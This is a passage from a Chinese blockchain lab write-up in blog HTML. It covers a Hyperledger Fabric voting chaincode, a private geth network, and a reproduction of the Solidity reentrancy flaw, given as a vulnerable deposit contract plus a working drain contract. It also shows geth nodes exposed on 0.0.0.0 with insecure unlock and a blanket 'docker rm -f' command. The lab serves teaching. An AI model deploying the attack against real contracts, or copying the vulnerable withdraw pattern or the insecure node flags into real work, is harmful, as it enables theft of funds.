     <span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">        <span class="string">&quot;fmt&quot;</span></span><br><span class="line">        <span class="string">&quot;strconv&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;github.com/hyperledger/fabric/core/chaincode/shim&quot;</span></span><br><span class="line">        <span class="string">&quot;github.com/hyperledger/fabric/protos/peer&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// VoteChaincode 结构体定义</span></span><br><span class="line"><span class="keyword">type</span> VoteChaincode <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Init 是链码的初始化函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *VoteChaincode)</span></span> Init(stub shim.ChaincodeStubInterface) peer.Response &#123;</span><br><span class="line">        <span class="keyword">return</span> shim.Success(<span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Invoke 是链码的调用函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *VoteChaincode)</span></span> Invoke(stub shim.ChaincodeStubInterface) peer.Response &#123;</span><br><span class="line">        fn, args := stub.GetFunctionAndParameters()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> fn == <span class="string">&quot;vote&quot;</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> vote(stub, args)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> get(stub, args)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// vote 是投票函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">vote</span><span class="params">(stub shim.ChaincodeStubInterface, args []<span class="type">string</span>)</span></span> peer.Response &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(args) != <span class="number">1</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> shim.Error(<span class="string">&quot;Incorrect arguments. Expecting a name&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        name := args[<span class="number">0</span>]</span><br><span class="line">        voteAsBytes, err := stub.GetState(name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> shim.Error(err.Error())</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        voteCount := <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> voteAsBytes != <span class="literal">nil</span> &#123;</span><br><span class="line">                voteCount = BytesToInt(voteAsBytes)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        err = stub.PutState(name, IntToBytes(voteCount+<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> shim.Error(err.Error())</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> shim.Success(<span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get 是查询函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">get</span><span class="params">(stub shim.ChaincodeStubInterface, args []<span class="type">string</span>)</span></span> peer.Response &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(args) == <span class="number">0</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> getAll(stub)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="built_in">len</span>(args) == <span class="number">1</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> getOne(stub, args[<span class="number">0</span>])</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> shim.Error(<span class="string">&quot;Incorrect arguments.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// getAll 获取所有投票结果</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getAll</span><span class="params">(stub shim.ChaincodeStubInterface)</span></span> peer.Response &#123;</span><br><span class="line">        resultIterator, err := stub.GetStateByRange(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> shim.Error(err.Error())</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">defer</span> resultIterator.Close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> buffer bytes.Buffer</span><br><span class="line">        buffer.WriteString(<span class="string">&quot;[&quot;</span>)</span><br><span class="line"></span><br><span class="line">        isWritten := <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> resultIterator.HasNext() &#123;</span><br><span class="line">                queryResult, err := resultIterator.Next()</span><br><span class="line">                <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> shim.Error(err.Error())</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> isWritten == <span class="literal">true</span> &#123;</span><br><span class="line">                        buffer.WriteString(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                buffer.WriteString(queryResult.Key)</span><br><span class="line">                buffer.WriteString(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">                buffer.WriteString(strconv.Itoa(BytesToInt(queryResult.Value)))</span><br><span class="line">                isWritten = <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        buffer.WriteString(<span class="string">&quot;]&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> shim.Success(buffer.Bytes())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// getOne 获取特定名称的投票结果</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getOne</span><span class="params">(stub shim.ChaincodeStubInterface, name <span class="type">string</span>)</span></span> peer.Response &#123;</span><br><span class="line">        voteAsBytes, err := stub.GetState(name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> shim.Error(err.Error())</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        count := <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> voteAsBytes != <span class="literal">nil</span> &#123;</span><br><span class="line">                count = BytesToInt(voteAsBytes)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> buffer bytes.Buffer</span><br><span class="line">        buffer.WriteString(<span class="string">&quot;[&quot;</span>)</span><br><span class="line"></span><br><span class="line">        buffer.WriteString(name)</span><br><span class="line">        buffer.WriteString(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        buffer.WriteString(strconv.Itoa(count))</span><br><span class="line"></span><br><span class="line">        buffer.WriteString(<span class="string">&quot;]&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> shim.Success(buffer.Bytes())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main 函数是链码的入口点</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err := shim.Start(<span class="built_in">new</span>(VoteChaincode)); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Printf(<span class="string">&quot;Error starting vote chaincode: %s&quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IntToBytes 将整数转换为字节数组</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IntToBytes</span><span class="params">(n <span class="type">int</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">        x := <span class="type">int32</span>(n)</span><br><span class="line">        bytesBuffer := bytes.NewBuffer([]<span class="type">byte</span>&#123;&#125;)</span><br><span class="line">        binary.Write(bytesBuffer, binary.BigEndian, x)</span><br><span class="line">        <span class="keyword">return</span> bytesBuffer.Bytes()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// BytesToInt 将字节数组转换为整数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BytesToInt</span><span class="params">(b []<span class="type">byte</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        bytesBuffer := bytes.NewBuffer(b)</span><br><span class="line">        <span class="keyword">var</span> x <span class="type">int32</span></span><br><span class="line">        binary.Read(bytesBuffer, binary.BigEndian, &amp;x)</span><br><span class="line">        <span class="keyword">return</span> <span class="type">int</span>(x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>按照以下步骤执行启动：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1号终端：启动网络</span></span><br><span class="line"><span class="built_in">cd</span> ../../chaincode-docker-devmode</span><br><span class="line">docker compose -f docker-compose-simple.yaml up</span><br><span class="line"><span class="comment"># 2号终端：启动chaincode</span></span><br><span class="line">docker <span class="built_in">exec</span> -it chaincode bash</span><br><span class="line"><span class="built_in">cd</span> vote/</span><br><span class="line">go build</span><br><span class="line">CORE_PEER_ADDRESS=peer:7052 CORE_CHAINCODE_ID_NAME=mycc:0 ./vote</span><br><span class="line"><span class="comment"># 3号终端：使用chaincode</span></span><br><span class="line">docker <span class="built_in">exec</span> -it cli bash</span><br><span class="line">peer chaincode install -p chaincodedev/chaincode/vote -n mycc -v 0</span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">peer chaincode instantiate -n mycc -v 0 -c <span class="string">&#x27;&#123;&quot;Args&quot;:[]&#125;&#x27;</span> -C myc</span><br><span class="line"><span class="comment"># 投票</span></span><br><span class="line">peer chaincode invoke -n mycc -c <span class="string">&#x27;&#123;&quot;Args&quot;:[&quot;vote&quot;, &quot;Mike&quot;]&#125;&#x27;</span> -C myc</span><br></pre></td></tr></table></figure>
-
-<p>实验测试，查询投票结果：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询所有</span></span><br><span class="line">peer chaincode invoke -n mycc -c <span class="string">&#x27;&#123;&quot;Args&quot;:[&quot;get&quot;]&#125;&#x27;</span> -C myc</span><br><span class="line"><span class="comment"># 查询单个</span></span><br><span class="line">peer chaincode invoke -n mycc -c <span class="string">&#x27;&#123;&quot;Args&quot;:[&quot;get&quot;, &quot;Mike&quot;]&#125;&#x27;</span> -C myc</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20231203085401363.png" alt="image-20231203085401363"></p>
-<p><img src="/images/image-20231203085425591.png" alt="image-20231203085425591"></p>
-<h4 id="排故-1"><a href="#排故-1" class="headerlink" title="排故"></a>排故</h4><p>这里出现一个问题，当运行<code>docker exec</code>时可能会进不去，提示形如下文：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我的cli这一个container进不去</span></span><br><span class="line">container xxxx is not running</span><br></pre></td></tr></table></figure>
-
-<p>自己手动启动<code>docker start</code>也没有用，查看<code>docker logs cli</code>发现最后有这样的报错：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: got unexpected status: BAD_REQUEST -- error applying config update to existing channel <span class="string">&#x27;myc&#x27;</span>: error authorizing update: error validating ReadSet: proposed update requires that key [Group]  /Channel/Application be at version 0, but it is currently at version 1</span><br></pre></td></tr></table></figure>
-
-<p>笑吸了，原来是上次的镜像没有关，导致已经有一个channel，阻止了下一步的进行，具体表现为更新通道配置时产生了矛盾，全都关掉重来：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> -f $(docker ps -aq)</span><br></pre></td></tr></table></figure>
-
-<p>然后就能顺利进去了，nice</p>
-<h3 id="ethereum"><a href="#ethereum" class="headerlink" title="ethereum"></a>ethereum</h3><p>参考<a target="_blank" rel="noopener" href="https://geth.ethereum.org/docs/">https://geth.ethereum.org/docs/</a></p>
-<h4 id="前置环境-1"><a href="#前置环境-1" class="headerlink" title="前置环境"></a>前置环境</h4><p>安装以太坊工具：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository -y ppa:ethereum/ethereum</span><br><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install ethereum</span><br></pre></td></tr></table></figure>
-
-<h4 id="任务-1：搭建一个以太坊的多节点私有网络"><a href="#任务-1：搭建一个以太坊的多节点私有网络" class="headerlink" title="任务 1：搭建一个以太坊的多节点私有网络"></a>任务 1：搭建一个以太坊的多节点私有网络</h4><p>按照以下步骤进行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> node1 node2</span><br><span class="line"><span class="comment"># 密码都用123456，注意记下Address</span></span><br><span class="line">geth --datadir node1 account new <span class="comment"># 0x41090BEc560C3a9fc33d929c45F6D051AA064415</span></span><br><span class="line">geth --datadir node2 account new <span class="comment"># 0x4126B653636e5a47aBd28408FB285B6Bf69fEFb7</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;123456&quot;</span> &gt;&gt; password.txt</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建 genesis.json，alloc里的两个要改成我们新建的那两个node，extradata中间的那一块改成node1</span></span><br><span class="line"><span class="comment"># ----------------------</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;config&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;chainId&quot;</span>: 12345,</span><br><span class="line">    <span class="string">&quot;homesteadBlock&quot;</span>: 0,</span><br><span class="line">    <span class="string">&quot;eip150Block&quot;</span>: 0,</span><br><span class="line">    <span class="string">&quot;eip155Block&quot;</span>: 0,</span><br><span class="line">    <span class="string">&quot;eip158Block&quot;</span>: 0,</span><br><span class="line">    <span class="string">&quot;byzantiumBlock&quot;</span>: 0,</span><br><span class="line">    <span class="string">&quot;constantinopleBlock&quot;</span>: 0,</span><br><span class="line">    <span class="string">&quot;petersburgBlock&quot;</span>: 0,</span><br><span class="line">    <span class="string">&quot;istanbulBlock&quot;</span>: 0,</span><br><span class="line">    <span class="string">&quot;muirGlacierBlock&quot;</span>: 0,</span><br><span class="line">    <span class="string">&quot;berlinBlock&quot;</span>: 0,</span><br><span class="line">    <span class="string">&quot;londonBlock&quot;</span>: 0,</span><br><span class="line">    <span class="string">&quot;arrowGlacierBlock&quot;</span>: 0,</span><br><span class="line">    <span class="string">&quot;grayGlacierBlock&quot;</span>: 0,</span><br><span class="line">    <span class="string">&quot;clique&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;period&quot;</span>: 5,</span><br><span class="line">      <span class="string">&quot;epoch&quot;</span>: 30000</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;difficulty&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;gasLimit&quot;</span>: <span class="string">&quot;800000000&quot;</span>,</span><br><span class="line">  <span class="string">&quot;extradata&quot;</span>: <span class="string">&quot;0x000000000000000000000000000000000000000000000000000000000000000041090BEc560C3a9fc33d929c45F6D051AA0644150000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span>,</span><br><span class="line">  <span class="string">&quot;alloc&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;41090BEc560C3a9fc33d929c45F6D051AA064415&quot;</span>: &#123; <span class="string">&quot;balance&quot;</span>: <span class="string">&quot;100000000000000000000&quot;</span> &#125;,</span><br><span class="line">    <span class="string">&quot;4126B653636e5a47aBd28408FB285B6Bf69fEFb7&quot;</span>: &#123; <span class="string">&quot;balance&quot;</span>: <span class="string">&quot;100000000000000000000&quot;</span> &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># ---------------------</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">geth init --datadir node1 genesis.json</span><br><span class="line">geth init --datadir node2 genesis.json</span><br><span class="line">bootnode -genkey boot.key</span><br><span class="line">bootnode -nodekey boot.key -addr :30305</span><br></pre></td></tr></table></figure>
-
-<p>这里我把<code>-addr</code>参数漏掉了，导致自动分配了30301，好像不影响，所以下面我就直接贴这个enode了，正常的话最后应该是30305</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建两个新终端分别运行node，注意unlock参数要改成node的address</span></span><br><span class="line"><span class="comment"># bootnodes 后面的一串要改成你上面运行那个命令输出的内容</span></span><br><span class="line"><span class="comment"># node1最后的miner.etherbase也要改成node1的address，node2不用这个参数</span></span><br><span class="line">geth --datadir node1 --port 30306 --bootnodes enode://5d170c8052b0cfa35154626b03bd4d1bac54bc4998620893b49962452c664826790ee8ea529ca082bb88088396c88cd8714db15b259ab62de4da0d1b496a73db@127.0.0.1:0?discport=30301  --networkid 123454321 --unlock 0x41090BEc560C3a9fc33d929c45F6D051AA064415 --password password.txt --authrpc.port 8551 --http --http.addr 0.0.0.0 --http.port 8545 --http.corsdomain <span class="string">&quot;*&quot;</span> --allow-insecure-unlock --mine --miner.etherbase=0x41090BEc560C3a9fc33d929c45F6D051AA064415</span><br><span class="line">geth --datadir node2 --port 30307 --bootnodes enode://5d170c8052b0cfa35154626b03bd4d1bac54bc4998620893b49962452c664826790ee8ea529ca082bb88088396c88cd8714db15b259ab62de4da0d1b496a73db@127.0.0.1:0?discport=30301  --networkid 123454321 --unlock 0x4126B653636e5a47aBd28408FB285B6Bf69fEFb7 --password password.txt --authrpc.port 8552 --http --http.addr 0.0.0.0 --http.port 8546 --http.corsdomain <span class="string">&quot;*&quot;</span> --allow-insecure-unlock</span><br><span class="line"><span class="comment"># 开另一个终端连接到node1</span></span><br><span class="line">geth attach node1/geth.ipc</span><br><span class="line"><span class="comment"># 查看余额</span></span><br><span class="line">eth.getBalance(eth.accounts[0])</span><br><span class="line"><span class="comment"># 在node1的账号发1给node2，注意改地址</span></span><br><span class="line">eth.sendTransaction(&#123;</span><br><span class="line">  to: <span class="string">&#x27;0x4126B653636e5a47aBd28408FB285B6Bf69fEFb7&#x27;</span>,</span><br><span class="line">  from: eth.accounts[0],</span><br><span class="line">  value: 25000</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment"># 查看自己的余额和node2的余额，注意改地址</span></span><br><span class="line">eth.getBalance(eth.accounts[0])</span><br><span class="line">eth.getBalance(<span class="string">&#x27;0x4126B653636e5a47aBd28408FB285B6Bf69fEFb7&#x27;</span>)</span><br><span class="line"><span class="comment"># 如果node1减少了不止1，node2加了1，那么恭喜你顺利完成！</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20231203085103161.png" alt="image-20231203085103161"></p>
-<p>连接到 Remix：<a target="_blank" rel="noopener" href="http://remix.ethereum.org/#lang=zh&optimize=false&runs=200&evmVersion=null&version=soljson-v0.4.26+commit.4563c3fc.js&language=Solidity">http://remix.ethereum.org/#lang=zh&amp;optimize=false&amp;runs=200&amp;evmVersion=null&amp;version=soljson-v0.4.26+commit.4563c3fc.js&amp;language=Solidity</a></p>
-<p>这一步可以在主机进行，环境选择Custom - External Http Provider，Address 分别是  <a target="_blank" rel="noopener" href="http://ip:8545/">http://ip:8545</a> 和 <a target="_blank" rel="noopener" href="http://ip:8546/">http://ip:8546</a>，虚拟机ip使用<code>ifconfig</code>查看</p>
-<h4 id="任务-2：复现重入漏洞"><a href="#任务-2：复现重入漏洞" class="headerlink" title="任务 2：复现重入漏洞"></a>任务 2：<strong>复现重入漏洞</strong></h4><p>Remix:<a target="_blank" rel="noopener" href="http://remix.ethereum.org/#lang=zh&optimize=false&runs=200&evmVersion=null&version=soljson-v0.4.26+commit.4563c3fc.js&language=Solidity">http://remix.ethereum.org/#lang=zh&amp;optimize=false&amp;runs=200&amp;evmVersion=null&amp;version=soljson-v0.4.26+commit.4563c3fc.js&amp;language=Solidity</a></p>
-<p>参考视频：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1fe4y1e7zc/">https://www.bilibili.com/video/BV1fe4y1e7zc/</a></p>
-<p>正常存款合约：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// v.sol</span><br><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">    address _owner;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">Reentrance</span></span>() &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> withdraw(uint256 amount) public payable &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount);</span><br><span class="line">        require(this.balance &gt;= amount);</span><br><span class="line"></span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>攻击合约：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// a.sol</span><br><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;./v.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract ReentranceAttack &#123;</span><br><span class="line">    Reentrance re;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> ReentranceAttack(address _target) public payable &#123;</span><br><span class="line">        re = Reentrance(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> attack() public payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether);</span><br><span class="line">        re.deposit.value(1 ether)();</span><br><span class="line">        re.withdraw(1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> collect() public &#123;</span><br><span class="line">        msg.sender.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span>() public payable &#123;</span><br><span class="line">        <span class="keyword">if</span> (re.balance &gt;= 1 ether) &#123;</span><br><span class="line">            re.withdraw(1 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编译后部署，注意编译时选择对应的正确版本，即0.4.19，编译时会报一些warning。A 存 1 个以太，B 存 1 个以太，A 再通过 attack 存 1 个以太，此时攻击合约会将原本的两个都取出来，实现偷取，最后A再取出的话总共就有3个了。</p>
-<h4 id="大致原理解释"><a href="#大致原理解释" class="headerlink" title="大致原理解释"></a>大致原理解释</h4><p>观察存款合约中的取款函数发现，先是由取款方发送请求，取款函数判断余额条件，取款，再真正扣减余额量：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> withdraw(uint256 amount) public payable &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount);</span><br><span class="line">        require(this.balance &gt;= amount);</span><br><span class="line"></span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>而攻击合约中，有这样一个payable备用函数利用了这个漏洞进行攻击，当我们执行到取款合约的<code>require(balances[msg.sender] &gt;= amount)</code>这一处时，由于功能特性，会调用到取款发起者，也就是攻击合约的备用函数<code>function() public payble</code>，而这一攻击函数会重新进行提款请求，由于先前提及的，此时余额还没有真正扣减，因此本次重新提及的提款请求是通过的，这就实现了偷取：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>() public payable &#123;</span><br><span class="line">        <span class="keyword">if</span> (re.balance &gt;= 1 ether) &#123;</span><br><span class="line">            re.withdraw(1 ether);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x41090BEc560C3a9fc33d929c45F6D051AA064415</span><br><span class="line">0x4126B653636e5a47aBd28408FB285B6Bf69fEFb7</span><br><span class="line">geth --datadir node1 --port 30306 --bootnodes enode://88310521aa8fade154d1d58c94a4feccd3345581c325e020e99a574caf1a71d1432322780cbdb7535a67c8e1bd767e0debe921ac921cb85e418872546980cf26@127.0.0.1:0?discport=30305  --networkid 123454321 --unlock 0x41090BEc560C3a9fc33d929c45F6D051AA064415 --password password.txt --authrpc.port 8551 --http --http.addr 0.0.0.0 --http.port 8545 --http.corsdomain <span class="string">&quot;*&quot;</span> --allow-insecure-unlock --mine --miner.etherbase=0x41090BEc560C3a9fc33d929c45F6D051AA064415</span><br><span class="line">geth --datadir node2 --port 30307 --bootnodes enode://88310521aa8fade154d1d58c94a4feccd3345581c325e020e99a574caf1a71d1432322780cbdb7535a67c8e1bd767e0debe921ac921cb85e418872546980cf26@127.0.0.1:0?discport=30305  --networkid 123454321 --unlock 0x4126B653636e5a47aBd28408FB285B6Bf69fEFb7 --password password.txt --authrpc.port 8552 --http --http.addr 0.0.0.0 --http.port 8546 --http.corsdomain <span class="string">&quot;*&quot;</span> --allow-insecure-unlock</span><br><span class="line">eth.sendTransaction(&#123;  to: <span class="string">&#x27;0x4126B653636e5a47aBd28408FB285B6Bf69fEFb7&#x27;</span>,  from: eth.accounts[0],  value: 